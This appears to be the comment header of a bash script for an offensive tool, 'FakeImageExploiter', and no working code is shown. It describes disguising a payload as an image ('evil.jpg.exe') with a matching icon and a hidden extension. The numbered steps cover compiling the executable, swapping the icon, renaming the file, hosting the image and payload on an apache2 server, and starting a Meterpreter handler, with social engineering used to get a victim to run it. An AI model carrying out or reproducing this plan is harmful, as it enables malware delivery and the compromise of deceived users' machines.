#!/bin/bash

##
# FakeImageExploiter v1.0 - image.jpg.exe
# Version: v1.0 (Alpha)
# Author: pedro ubuntu [ r00t-3xp10it ]
# CodeName: troia_revisited_again
# Distros Supported : Linux Ubuntu, Kali, Mint, Parrot OS
# ---
# Description:
#   This module takes one existing image.jpg and one payload.exe (input by user) and
#   builds a new payload (evil.jpg.exe) that if executed it will trigger the download
#   of the 2 previous files stored into apache2 webserver (image.jpg + payload.exe).
#   This module also changes the payload Icon to match the input image.jpg Then uses
#   'hides known file extensions' to hidde the .exe extension (final: evil.jpg.exe) ..
#
# Exploitation:
#   evil.jpg.exe final binary should be deliver to target using social enginnering
#   (apache2) to trick user into pressing the fake_image.jpg.exe (malicious binary).
#   When executed the evil.jpg.exe will download and open the image.jpg and the
#   payload.exe from our apache2 webserver, and execute the two of them ..
# ---
# Credits: https://null-byte.wonderhowto.com/how-to/hide-virus-inside-fake-picture-0168183
# Suspicious-Shell-Activity (SSA) RedTeam develop @2017
##



# 1 - create executable.exe
# 2 - sed and compile this file

#       10.0.0.13 - replace by - LhOsT
#       payload.exe - replace by - PaYlO
#       screenshot.jpg - replace by - ScRee
#       gcc evil.c -o evil.exe (compile to exe)

# 3 - Making the Executable 'Look' Like a Picture (resource hacker)
# 4 - Renaming the Executable (mv evil.exe evil.jpg.exe) -> (user input) 
# 5 - port the 3 files to apache2 webserver
# 6 - start a multi hadler + apache2 ..

# TODO: sed replacement (stage 2)..
# TODO: build cleanner.rc to be called in meterpreter console (manual)
#        C:\\Users\\Public\\image.jpg + payload.exe
# TODO: if does not execute payload.exe then use r3lik .txt payload ..


